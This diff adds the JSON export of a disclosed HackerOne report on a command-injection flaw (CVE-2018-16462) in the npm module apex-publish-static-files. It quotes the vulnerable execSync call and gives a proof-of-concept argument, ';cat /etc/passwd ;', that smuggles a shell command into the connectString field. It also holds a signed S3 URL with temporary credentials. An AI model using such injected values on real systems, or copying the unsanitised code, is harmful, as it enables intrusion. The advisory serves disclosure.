@@ -1,0 +1,167 @@
+{
+  "id": 405694,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC80MDU2OTQ=",
+  "url": "https://hackerone.com/reports/405694",
+  "title": "[apex-publish-static-files] Command Injection on connectString",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "critical",
+  "readable_substate": "Resolved",
+  "created_at": "2018-09-05T01:49:30.554Z",
+  "submitted_at": "2018-09-05T01:49:30.554Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "abdilahrf_",
+    "url": "/abdilahrf_",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/bsm9e70lm64ys0s633r55gvcmhcn/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1"
+    },
+    "is_me?": false,
+    "cleared": true,
+    "verified": true,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 23949,
+    "url": "https://hackerone.com/nodejs-ecosystem",
+    "handle": "nodejs-ecosystem",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/023/949/3ea3b2ae039a8f955a4a8fe65d99fe85dc817398_original./235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/023/949/3ea3b2ae039a8f955a4a8fe65d99fe85dc817398_original./3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"
+    },
+    "permissions": [],
+    "submission_state": "disabled",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "Node.js third-party modules",
+      "twitter_handle": "",
+      "website": "https://nodejs.org/en/security/",
+      "about": "This program was used to handle vulnerabilities in the Node.js ecosystem."
+    }
+  },
+  "has_bounty?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [
+    "CVE-2018-16462"
+  ],
+  "singular_disclosure_disabled": false,
+  "disclosed_at": "2018-10-18T18:32:08.981Z",
+  "bug_reporter_agreed_on_going_public_at": "2018-10-18T18:32:08.871Z",
+  "team_member_agreed_on_going_public_at": "2018-10-18T17:40:15.705Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "I would like to report a command injection vulnerability in the apex-publish-static-files npm module.\nIt allows arbitrary shell command execution through a maliciously crafted argument.\n\n# Module\n\n**module name:** apex-publish-static-files\n**version:** 2.0.0\n**npm page:** `https://www.npmjs.com/package/apex-publish-static-files`\n\n## Module Description\n\n>Uploads all files from a local directory to Oracle APEX\n\n## Module Stats\n\n15 downloads in the last day\n~170 downloads in the last month\n\n# Vulnerability\n\n## Vulnerability Description\n\napex-publish-static-files does not sanitize the connectionString argument, and subsequently passes it to execSync(), thus allowing arbitrary shell command injection. \n\nVulnerability Code : [https://github.com/vincentmorneau/apex-publish-static-files/blob/master/index.js#54-66](https://github.com/vincentmorneau/apex-publish-static-files/blob/master/index.js#54-66)\n\n```\n\t\t\tconst childProcess = execSync(\n\t\t\t\t'\"' + opts.sqlclPath + '\"' + // Sqlcl path\n\t\t\t\t' ' + opts.connectString + // Connect string (user/pass@server:port/sid)\n\t\t\t\t' @\"' + path.resolve(__dirname, 'lib/script') + '\"' + // Sql to execute\n\t\t\t\t' \"' + path.resolve(__dirname, 'lib/distUpload.js') + '\"' + // Param &1 (js to execute)\n\t\t\t\t' \"' + path.resolve(opts.directory) + '\"' + // Param &2\n\t\t\t\t' ' + opts.appID + // Param &3\n\t\t\t\t' \"' + opts.destination + '\"' + // Param &4\n\t\t\t\t' \"' + opts.pluginName + '\"' // Param &5\n\t\t\t\t, {\n\t\t\t\t\tencoding: 'utf8'\n\t\t\t\t}\n\t\t\t);\n```\n\n\n## Steps To Reproduce:\n\n- npm i apex-publish-static-files\n- create index.js file like this :\n\n```\nvar publisher = require('apex-publish-static-files');\n \npublisher.publish({\nconnectString: \";cat /etc/passwd ;\",\n    directory: \"public\",\n    appID: 111\n});\n```\n- execute `node index.js`\n\nF342500\n\n## Supporting Material/References:\n\nOS: WSL Ubuntu 16.04\nNODE: v10.8.0\nNPM : 6.2.0\n\n\n# Wrap up\n\n- I contacted the maintainer to let them know: N\n- I opened an issue in the related repository: N\n\n## Impact\n\nIt allows arbitrary shell command execution through a maliciously crafted argument.",
+  "weakness": {
+    "id": 58,
+    "name": "Command Injection - Generic"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+    {
+      "id": 342500,
+      "file_name": "apex_rce.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/342/500/720241327c9f70cbc7701c16bb89ea8d113b108d/apex_rce.png?response-content-disposition=attachment%3B%20filename%3D%22apex_rce.png%22%3B%20filename%2A%3DUTF-8%27%27apex_rce.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQVEJIXONP%2F20250921%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250921T165738Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEI7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJGMEQCIH8AfdM1IKkiBfUEz%2FBO7LFjez%2BUQDg01sIrpsf4EUcBAiBSpVIGQhH6dvIVEdS013E3d77NSPuZ6tkJqUiut1d5ayqxBQgXEAMaDDAxMzYxOTI3NDg0OSIM5KKvvFo%2FqCzdKYojKo4F1%2BxUKjmtoEnCcoIjJvK408ALZil4QNP4qd%2B9SxE2nN4XJtMsRrYo337HtrFn5oO%2FaZ%2Fo7msCxdECjjQnR%2B%2BiOIRw47xO%2BN%2BroD4eFU0Lis8VXL7dneMK0%2FZKVqVB%2BC9tGiRF8jr69GjaOncBp0t%2BX3cMNxBXvRLz3bKIbAg4La2IjqOjzgBTnn%2BIQ3Yhe4BZXvg3RG5sRY2fxBARtQlU7dKqtW6H02iITGdunmfJ1IT%2B3XU2w03%2FcST6rc293dotAdvtrqi681dI6SPYP5SZFsFaToGOXjSXYCaiYNylKPtCRLxqaQMRG5TQX9%2ByCCOVPymZiYFyP%2BNOadkXnUbMb2eQoJYrzOSkfeHj2bWS3RmbO0DRT%2Ff3P4edxF6mtA4y5a5Rbb9QQmxfvt2CB%2B9H4K0szePZZxL3RAcHqBhvq60iVi2HG9fbJX6X9KRmIe60IihzAb8bPagbeh9aJD2NPOr97NdRsEOyoTZVTVqJq3dZTERme2wlhIVMu5zrFQmWXEFknB4fS17jS5t8TKS4KTjVFpEZmE7fMH738HaaBGO4Vg2iNfyjYzLcWfZx%2FUbEXuG1t98I6yBnAESEHAv346Q0BPQr%2Bz87XrCSQdjmWab9zu6ALnBNaKQo4GsSmEixRTkV%2BfZTJFbhc6J1kQlOqv5S36YxT%2B7%2FW3YfSFHXiDLqoNDDaFU6Xrxf4B3AZla5abRXGNVFTHsf6qhKV9VxT%2BVVeQn%2FdCSZGarNUggIqacMenhuAX0nJZEiqxIEeJsJkkM%2BdIXSTEfPjpuSr4EgWjzOTshSC70x%2BG3z5Xy9Rg0898Dqo9%2B6bgq2Y6eUlND5h9YFj2B6tvh%2FxxMTFsGZpgowwHabY0dQaABJE0FHMIWMwMYGOrIB%2FnjXTbo03i5xP3rcMU3bObaCEWOYTy%2F50Ggf7zk3XIOVnx9L4WAz0%2BkC4QuUVgTdg4m3vSVaCadxQKgpnOARKNEU7hiIdSjWNWsznEUhz3m0VcGL8VLeBZxihvQtGtDTEtGjHNLS%2FKP80xsNti6GBmErPMO5xp0uYHZmDW87sx6pMfyUJD3jZY9hW1E%2BtCtsgwzAj7%2FoAV6Xj647N%2F89fogX1xb57jhfm0OpuwqOUaJLQw%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=46f9376f187410818d0359b5b37ef1412205075143e5da3e840673f2ea3fd015",
+      "file_size": 130347,
+      "type": "image/png",
+      "moderated": null
+    }
+  ],
+  "allow_singular_disclosure_at": "2018-11-17T17:40:15.807Z",
+  "allow_singular_disclosure_after": -215997442.46226364,
+  "singular_disclosure_allowed": true,
+  "vote_count": 10,
+  "voters": [
+    "yukusawa18",
+    "ali",
+    "bl4de",
+    "abdilahrf_",
+    "eveeez",
+    "cryptographer",
+    "mirfansulaiman",
+    "naamane",
+    "not_hackerone_hackerone",
+    "whichisbad"
+  ],
+  "severity": {
+    "rating": "critical",
+    "score": 10.0,
+    "author_type": "Team",
+    "metrics": {
+      "attack_vector": "network",
+      "attack_complexity": "low",
+      "privileges_required": "none",
+      "user_interaction": "none",
+      "scope": "changed",
+      "confidentiality": "high",
+      "integrity": "high",
+      "availability": "high"
+    }
+  },
+  "structured_scope": {
+    "databaseId": 14208,
+    "asset_type": "SOURCE_CODE",
+    "asset_identifier": "apex-publish-static-files",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "summaries": [
+    {
+      "id": 11142,
+      "category": "team",
+      "content": "vulnerable_versions <= 2.0.0\npatched versions >= 2.0.1",
+      "updated_at": "2018-10-18T17:40:06.392Z",
+      "can_view?": true,
+      "can_create?": false,
+      "attachments": [],
+      "user": {
+        "id": 96045,
+        "username": "lirantal",
+        "name": "Liran Tal",
+        "bio": "",
+        "cleared": false,
+        "verified": false,
+        "website": "https://github.com/lirantal/",
+        "location": "Israel",
+        "created_at": "2016-07-27T19:53:42.573Z",
+        "url": "https://hackerone.com/lirantal",
+        "hackerone_triager": false,
+        "hackerone_employee": false,
+        "user_type": "hacker",
+        "profile_picture_urls": {
+          "small": "https://profile-photos.hackerone-user-content.com/variants/000/096/045/7e9d9170c9862d8d3697b11b0bb7160d40444c16_original.jpeg/c8a1698ff707a5e3e8a91a3484838363845daac68cb82c86d55c9e2d44d67b67",
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/096/045/7e9d9170c9862d8d3697b11b0bb7160d40444c16_original.jpeg/74790fe75ac5dbe8a5140a122388d59ebac913dcfa941f0b3a45e6cad161f9ea",
+          "xtralarge": "https://hackerone.com/rails/active_storage/representations/redirect/eyJfcmFpbHMiOnsiZGF0YSI6MTY5OTYsInB1ciI6ImJsb2JfaWQifX0=--a5d820a0cdfaa42b8b98271cf29fc715439f43cd/eyJfcmFpbHMiOnsiZGF0YSI6eyJmb3JtYXQiOiJqcGVnIiwicmVzaXplIjoiMjYweDI2MFx1MDAzZSJ9LCJwdXIiOiJ2YXJpYXRpb24ifX0=--cea846659d6dfdc215f3c0fb14f7ed8ebc9f95ef/lirantal-github-thumbnail.jpeg"
+        }
+      }
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
